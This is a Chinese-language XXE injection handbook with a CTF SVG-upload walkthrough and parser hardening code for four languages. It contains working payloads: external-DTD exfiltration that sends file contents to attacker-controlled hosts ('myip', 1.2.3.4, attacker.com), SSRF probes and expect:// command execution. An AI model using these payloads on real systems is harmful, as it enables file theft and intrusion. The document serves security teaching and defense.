# EXP手册-XXE Injection(XML External Entity Injection)

## 一句话理解
XXE（XML External Entity Injection）是指应用在解析 XML 时，允许外部实体被解析，攻击者便可借助实体机制读取文件、发起请求、进行带外回传，甚至在特定环境下触发更深层的利用。

## 利用前提
XXE 能否成立，通常取决于以下条件：
- 应用接收并解析 XML 数据
- 解析器允许 DTD 或外部实体
- 传入内容能进入 XML 解析过程
- 解析结果、报错信息或带外请求能被观察到

常见入口：
- XML API
- SOAP / WebService
- SAML
- SVG
- Office 文档格式
- RSS / Atom
- 文件上传后由后端进行 XML 解析

## 基础知识
### 1. XML 与 DTD
DTD（Document Type Definition）用于定义 XML 文档结构，可声明元素、实体和外部资源引用。

示例：

```xml
<?xml version="1.0"?>
<!DOCTYPE message [
<!ELEMENT message (receiver, sender, header, msg)>
<!ELEMENT receiver (#PCDATA)>
<!ELEMENT sender (#PCDATA)>
<!ELEMENT header (#PCDATA)>
<!ELEMENT msg (#PCDATA)>
]>
<message>
  <receiver>Myself</receiver>
  <sender>Someone</sender>
  <header>TheReminder</header>
  <msg>This is an amazing book</msg>
</message>
```

### 2. 实体类型
内部实体：

```xml
<!ENTITY xxe "test">
```

外部实体：

```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">
```

参数实体：

```xml
<!ENTITY % remote SYSTEM "http://attacker/evil.dtd">
```

引用方式：
- 普通实体使用 `&name;`
- 参数实体使用 `%name;`，且只能在 DTD 中使用

### 3. 为什么 CDATA 有用
当读取到的内容中包含特殊字符时，XML 解析可能出错。`CDATA` 可以让内容作为纯文本处理，而不是再次按 XML 标签解释。

```xml
<![CDATA[
raw text here
]]>
```

如果要把读取到的文件包进 `CDATA` 中，可以借助外部 DTD 进行拼接。

`evil.dtd`：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY all "%start;%goodies;%end;">
```

注入内容：

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE roottag [
<!ENTITY % start "<![CDATA[">
<!ENTITY % goodies SYSTEM "file:///d:/test.txt">
<!ENTITY % end "]]>">
<!ENTITY % dtd SYSTEM "http://ip/evil.dtd">
%dtd;
]>
<roottag>&all;</roottag>
```

## 常见危害
- 读取本地文件，例如配置、源码、密钥、口令
- 通过 HTTP/DNS 做带外回传
- 作为 SSRF 访问内网服务
- 通过报错信息泄露敏感数据
- 在特定解析环境下触发协议级利用
- 与反序列化、文件上传、文档解析链形成复合漏洞

## 漏洞利用分类
### 1. 直接回显读取文件
适用于读取内容会进入响应体或页面的场景。

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE xxe [
<!ELEMENT name ANY>
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <name>&xxe;</name>
</root>
```

### 2. 无回显读取文件 OOB
当应用不直接返回解析结果时，可尝试 Blind XXE，通过带外通道把数据送出。

关键点：
- 使用外部 DTD
- 利用参数实体嵌套
- 借助 HTTP 或 DNS 回传

参数实体示例：

```xml
<?xml version="1.0"?>
<!DOCTYPE message [
<!ENTITY normal "hello">
<!ENTITY normal SYSTEM "http://xml.org/hhh.dtd">
<!ENTITY % para SYSTEM "file:///1234.dtd">
%para;
]>
```

参数实体嵌套时，内层 `%` 通常需要编码，否则容易解析失败：

```xml
<?xml version="1.0"?>
<!DOCTYPE test [
<!ENTITY % outside '<!ENTITY &#x25; files SYSTEM "file:///etc/passwd">'>
]>
```

#### Payload 1
外部 DTD `my.dtd`：

```xml
<!ENTITY % start "<!ENTITY &#x25; send SYSTEM 'http://myip/?%file;'>">
%start;
```

注入内容：

```xml
<?xml version="1.0"?>
<!DOCTYPE message [
<!ENTITY % remote SYSTEM "http://myip/my.dtd">
<!ENTITY % file SYSTEM "file:///flag">
%remote;
%send;
]>
```

#### Payload 2
利用本地 DTD 进行更深层嵌套，适合某些 Blind XXE 场景：

```xml
<?xml version="1.0"?>
<!DOCTYPE message [
<!ENTITY % remote SYSTEM "/usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % file SYSTEM "file:///flag">
<!ENTITY % ISOamso '
  <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; send SYSTEM &#x27;http://myip/?&#x25;file;&#x27;>">
  &#x25;eval;
  &#x25;send;
'>
%remote;
]>
```

### 3. 基于报错读取文件
思路与 OOB 接近，只是把文件内容拼接进错误路径中，让解析器把敏感内容带到错误信息里。

#### Payload 1
外部 DTD `my.dtd`：

```xml
<!ENTITY % start "<!ENTITY &#x25; send SYSTEM 'file:///re.about/%file;'>">
%start;
```

注入内容：

```xml
<?xml version="1.0"?>
<!DOCTYPE message [
<!ENTITY % remote SYSTEM "http://myip/my.dtd">
<!ENTITY % file SYSTEM "file:///flag">
%remote;
%send;
]>
```

#### Payload 2

```xml
<?xml version="1.0"?>
<!DOCTYPE message [
<!ENTITY % remote SYSTEM "/usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % file SYSTEM "file:///flag">
<!ENTITY % ISOamso '
  <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; send SYSTEM &#x27;file://re.about/?&#x25;file;&#x27;>">
  &#x25;eval;
  &#x25;send;
'>
%remote;
]>
```

#### Payload 3
有些环境即使不引用外部 DTD，也可能因为实现不严格而在多层嵌套中完成报错利用：

```xml
<?xml version="1.0"?>
<!DOCTYPE message [
<!ELEMENT message ANY>
<!ENTITY % para1 SYSTEM "file:///flag">
<!ENTITY % para '
  <!ENTITY &#x25; para2 "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///&#x25;para1;&#x27;>">
  &#x25;para2;
'>
%para;
]>
```

### 4. 作为 SSRF 使用
如果可以引用外部 URL，XXE 本质上也能转化成 SSRF：

```xml
<?xml version="1.0"?>
<!DOCTYPE any [
<!ENTITY f SYSTEM "http://127.0.0.1:80">
]>
<x>&f;</x>
```

利用方向：
- 访问内网 Web
- 探测端口
- 探测出网
- 访问云元数据

### 5. 特定环境下的代码执行
这类情况不常见，但在配置不当时可能出现。例如 PHP 开启 `expect` 扩展时：

```xml
<?xml version="1.0"?>
<!DOCTYPE gvi [
<!ELEMENT foo ANY>
<!ENTITY xxe SYSTEM "expect://id">
]>
<root>
  <name>&xxe;</name>
</root>
```

### 6. 协议扩展与文件写入
某些 Java 环境、解析器或应用处理链支持更多协议，例如：
- `jar://`
- `netdoc://`
- 各种语言运行时额外支持的自定义协议

这类能力有时可被用于：
- 列目录
- 读取压缩包内容
- 与文件上传链路结合

## XXExploiter 工具

Blind XXE 需要外部 DTD 配合参数实体嵌套，手工构造容易在编码细节上出错。XXExploiter 可以一键生成这套 payload：

- 项目地址：<https://github.com/luisfontes19/XXExploiter>

```bash
# 生成读取 /flag 并通过 HTTP 外带的 blind XXE payload
xxexploiter generate --host attacker.com --file /flag

# 读取目录（自动利用报错探测目录下的文件）
xxexploiter generate --host attacker.com --directory /var/www/html

# 让目标向指定 URL 发起请求（把 XXE 当 SSRF 用）
xxexploiter generate --host attacker.com --request http://127.0.0.1:8080/
```

使用流程：
1. 把生成的 `evil.dtd` 放到自己服务器上，目录与 `--host` 参数对应
2. 把生成的 XML payload 按题目入口格式改写（接口传参、SVG、DOCX 内嵌 xml 等）
3. 攻击机起服务收数据：`python -m http.server 80`

要点：
- 支持 base64 编码外带，规避文件内容中的特殊字符
- 支持自定义外带方式（HTTP / FTP）
- 目标是 PHP 环境时，优先配 `php://filter` 读 base64，比直接读文件稳定

## 不同环境差异
### 1. 语言与解析器差异很大
XXE 是否成立，不只取决于语言，还取决于：
- 使用的是哪个 XML 解析器
- DTD 是否启用
- 外部实体是否启用
- 是否允许网络访问
- 错误信息是否暴露

### 2. 现代框架可能默认关闭
很多现代库默认会禁用外部实体，但历史代码、兼容模式、手工配置、第三方组件经常会把风险重新带回来。

### 3. 文档格式是高频入口
不要只盯着显式 XML 接口，以下格式本质上都可能触发 XML 解析：
- SVG
- DOCX / XLSX / PPTX
- Android XML
- 各类导入导出文件

## 检测思路
### 1. 先确认是否解析 XML
关注请求头、接口文档、上传格式、SOAP 特征、报错信息。

### 2. 先用最小探针
优先验证：
- 能否插入 `DOCTYPE`
- 是否允许实体解析
- 是否存在外带请求

### 3. 从直接回显逐步升级
排查顺序建议：
1. 直接读取本地文件
2. 访问外部可控 URL
3. 使用外部 DTD 做 OOB
4. 尝试报错型读取
5. 结合协议特性探索更深利用

## 案例：SVG 上传 XXE 完整链路

一道 CTF 题的完整复盘：从 SVG 头像上传入口开始，到 blind XXE 外带读出 flag。

### 背景

站点提供头像上传，支持 PNG / JPG / SVG。上传 SVG 后，页面会把 SVG 内容渲染出来。SVG 本质是 XML，这是典型的 XXE 入口。

### 第一步：构造带外部实体的 SVG 验证

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="60">
  <text x="10" y="30" font-size="12">&xxe;</text>
</svg>
```

上传后页面文本节点直接渲染出 `/etc/passwd` 内容，确认三件事：
- 服务端按 XML 解析 SVG
- 外部实体开启
- 且是直接回显型 XXE

### 第二步：直接读 flag 失败

```xml
<!ENTITY xxe SYSTEM "file:///flag">
```

回显报错：flag 内容包含 XML 特殊字符，实体值导致解析失败、拿不到内容。换思路走 blind OOB，绕开文件内容对 XML 结构的影响。

### 第三步：搭建 OOB 外带

攻击机（`1.2.3.4`）上准备 `evil.dtd` 并起 HTTP 服务：

```bash
mkdir -p /srv/xxe && cd /srv/xxe
# 把 evil.dtd 放到该目录
python -m http.server 80
```

```xml
<!-- /srv/xxe/evil.dtd -->
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/flag">
<!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'http://1.2.3.4:80/?f=%file;'>">
%eval;
%send;
```

上传用于注入的 SVG（DOCTYPE 加在最前面，SVG 根节点不变）：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
<!ENTITY % remote SYSTEM "http://1.2.3.4/evil.dtd">
%remote;
]>
<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10">
  <rect width="10" height="10"/>
</svg>
```

要点：
- 用 `php://filter` 把文件内容转成 base64 再外带：第一次直接读 `file:///flag` 拼进 URL 时，内容里的换行会把 HTTP 请求行截断，外带失败——这是 OOB 最常见的坑
- 外部 DTD 里的内层 `%` 要写成 `&#x25;`，否则在内部 DTD 中会被提前解析
- 外部 DTD 才能使用“参数实体嵌套参数实体”的写法，内部 DTD 直接嵌套会报错

### 第四步：收数据、解 flag

攻击机日志：

```text
1.2.3.4 - - "GET /?f=ZmxhZ3t4eGVfMW5fU3ZnX3VwbG9hZH0= HTTP/1.1" 200 -
```

解码：

```bash
echo 'ZmxhZ3t4eGVfMW5fU3ZnX3VwbG9hZH0=' | base64 -d
# flag{xxe_1n_Svg_upload}
```

### 复盘要点

1. SVG / Office 文档这类“看起来是文件上传”的功能，真正入口是后端的 XML 解析
2. 有回显先打回显；回显被特殊字符卡住时再转 blind OOB
3. OOB 外带优先上 `php://filter` base64（PHP 环境）或 FTP 外带，规避换行截断问题
4. 防御侧对应：解析 SVG 时禁用 DTD 与外部实体，或干脆把用户上传的 SVG 当静态资源处理，不做服务端解析

## 防御要点
### 1. 禁用外部实体与 DTD
这是最核心的防御措施。

### 2. 使用安全解析器配置
确保：
- 禁止外部实体
- 禁止外部 DTD
- 禁止网络访问
- 限制实体展开深度和资源消耗

### 3. 尽量不用 XML 处理不可信输入
若业务可替代，优先使用更简单且默认更安全的数据格式。

### 4. 最小化错误信息
不要把解析异常、文件路径、完整堆栈直接返回前端。

### 5. 网络层做隔离
即使出现 XXE，也要限制应用访问：
- 内网敏感服务
- 云元数据
- 本地文件系统

## 各语言修复代码

### 1. Java

`DocumentBuilderFactory` / `SAXParserFactory` 默认允许外部实体，必须显式关闭：

```java
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.DocumentBuilder;
import org.w3c.dom.Document;

DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
try {
    // 彻底禁用 DTD：最推荐，直接让 <!DOCTYPE> 解析失败
    factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
    // 双保险：禁用外部普通实体与参数实体
    factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
    factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
} catch (javax.xml.parsers.ParserConfigurationException e) {
    throw new IllegalStateException(e);
}
// 禁用 XInclude 与实体引用展开
factory.setXIncludeAware(false);
factory.setExpandEntityReferences(false);

DocumentBuilder builder = factory.newDocumentBuilder();
Document doc = builder.parse(untrustedInputStream);  // 解析不可信输入
```

SAXParserFactory 同理，设置相同的 feature。注意 `setFeature` 会抛检查异常，需处理。

### 2. PHP

```php
<?php
// PHP < 8.0：禁用外部实体加载，配合 libxml 2.9.0+ 生效
// PHP >= 8.0：该函数已废弃（libxml 2.9+ 默认不再加载外部实体）
if (PHP_VERSION_ID < 80000 && function_exists('libxml_disable_entity_loader')) {
    libxml_disable_entity_loader(true);
}

$dom = new DOMDocument();
// LIBXML_NONET：禁止网络访问（外部 DTD / 实体）
// 注意：不要传 LIBXML_NOENT，它会把实体展开进文档，扩大利用面
$dom->loadXML($xml, LIBXML_NONET);

// SimpleXML 同理：
// simplexml_load_string($xml, 'SimpleXMLElement', LIBXML_NONET);
```

关键点：
- 不要使用 `LIBXML_NOENT`（实体替换）
- 老环境（libxml < 2.9）必须依赖 `libxml_disable_entity_loader(true)`，仅靠 flag 挡不住外部实体

### 3. Python

标准库 `xml.etree.ElementTree`、`xml.dom.minidom` 等默认不解析外部实体，但处理不可信输入统一推荐 `defusedxml`：

```python
# pip install defusedxml
from defusedxml.ElementTree import fromstring   # 直接替换标准库导入，用法一致
from defusedxml.minidom import parseString

# 会拦截外部实体与 DTD 展开
root = fromstring(untrusted_xml)

# 解析文件
from defusedxml.ElementTree import parse
tree = parse('untrusted.xml')
```

lxml 用户应显式配置解析器：

```python
from lxml import etree

# 不展开实体 + 禁止网络访问
parser = etree.XMLParser(resolve_entities=False, no_network=True)
tree = etree.parse(source, parser)
```

### 4. .NET

```csharp
using System.Xml;

var settings = new XmlReaderSettings();
// 禁止 DTD 处理：遇到 <!DOCTYPE> 直接抛异常
settings.DtdProcessing = DtdProcessing.Prohibit;
// 不解析任何外部资源
settings.XmlResolver = null;

using var reader = XmlReader.Create(untrustedStream, settings);
var doc = new XmlDocument();
doc.Load(reader);
```

## 速查清单
- 先找所有会解析 XML 的接口和文件格式
- 先测 `DOCTYPE` 是否可用，再测实体是否被解析
- 先尝试直接回显，再尝试 OOB 和报错型利用
- 检查文档处理链、SVG、Office 文件、SOAP、SAML
- 检查是否能转化为 SSRF、文件读取、云凭证获取
- 结合语言、解析器和部署环境判断真实危害

## 入门资料
- [一篇文章带你深入理解漏洞之 XXE 漏洞](https://xz.aliyun.com/t/3357)
- [XML external entity (XXE) injection](https://portswigger.net/web-security/xxe)

![](https://raw.githubusercontent.com/ReAbout/web-exp/master/images/xxe1.png)
![](https://raw.githubusercontent.com/ReAbout/web-exp/master/images/xxe-injection.svg?sanitize=true)

## Reference
- [一篇文章带你深入理解漏洞之 XXE 漏洞](https://xz.aliyun.com/t/3357)
- [XML external entity (XXE) injection](https://portswigger.net/web-security/xxe)
- [Exploiting XXE with local DTD files](https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/)
- [Blind XXE 详解与 Google CTF 一道题分析](https://www.freebuf.com/vuls/207639.html)
- [XXExploiter - XXE payload generator](https://github.com/luisfontes19/XXExploiter)
- [PayloadsAllTheThings - XXE Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md)
